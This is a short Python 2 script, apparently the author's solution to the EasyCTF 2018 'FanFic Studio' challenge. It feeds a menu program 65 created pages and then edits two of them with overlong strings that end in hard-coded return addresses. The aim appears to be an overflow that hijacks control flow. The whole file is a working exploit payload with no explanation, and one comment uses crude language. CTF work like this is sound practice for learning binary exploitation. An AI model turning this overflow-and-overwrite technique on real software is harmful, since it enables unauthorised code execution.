#! /usr/bin/env python2
##
# Created for EasyCTF 2018_FanFic Studio
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Fanfiction Title
print("A")

# First fucking 63 pages
for i in range(1, 64):
    print("1")
    print(i)
    print("A")
    print("a" * 64)

# Create 64th page
print("1")
print("64")
print("A")
print("a" * 64)

# Create 65th page
print("1")
print("65")
print("B")
print("b" * 68)

# Edit 64th page
print("1")
print("64")
print("c" * 254 + "abcd" + "\xb4\x87\x04\x08")

# Edit 65th page
print("1")
print("65")
print("d" * 254 + "abcd" + "\xef\x87\x04\x08")

# Run our exploit
print("3")
